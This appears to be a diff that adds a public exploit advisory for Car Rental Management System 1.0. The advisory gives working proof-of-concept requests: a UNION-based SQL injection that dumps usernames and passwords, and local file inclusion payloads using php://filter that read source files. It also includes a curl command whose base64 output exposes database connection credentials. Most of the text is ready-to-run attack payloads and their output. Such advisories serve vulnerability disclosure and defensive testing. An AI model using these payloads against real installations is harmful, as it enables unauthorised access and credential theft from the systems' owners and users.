@@ -1,0 +1,37 @@
+# Exploit Title: Car Rental Management System 1.0 - SQL Injection / Local File include
+# Date: 22-10-2020
+# Exploit Author: Mosaaed 
+# Vendor Homepage: https://www.sourcecodester.com/php/14544/car-rental-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14544&title=Car+Rental+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: parrot + Apache/2.4.46 (Debian)
+
+SQL Injection
+#Vulnerable Page: http://localhost/carRental/index.php?page=view_car&id=4
+
+#POC 1: 
+http://localhost/carRental/index.php?page=view_car&id=-4+union+select+1,2,3,4,5,6,concat(username,0x3a,password),8,9,10+from+users--
+
+LFI
+#Vulnerable Page1: http://localhost/carRental/index.php?page=about
+#Vulnerable Page2:http://localhost/carRental/admin/index.php?page=movement
+
+#POC 1:
+
+http://localhost/carRental/index.php?page=php://filter/convert.base64-encode/resource=home
+
+#POC 2:http://localhost/carRental/admin/index.php?page=php://filter/convert.base64-encode/resource=db_connect
+
+note POC 2 reading database information
+
+#example : 
+curl -s -i POST http://localhost/carRental/admin/index.php?page=php://filter/convert.base64-encode/resource=db_connect | grep view-panel -A 1
+
+#result
+
+<main id="view-panel" >
+        	PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyb290JywncGFzc3dvcmQnLCdjYXJfcmVudGFsX2RiJylvciBkaWUoIkNvdWxkIG5vdCBjb25uZWN0IHRvIG15c3FsIi5teXNxbGlfZXJyb3IoJGNvbikpOw0K
+
+#proof of concept picture
+
+https://ibb.co/8Dd7d9G
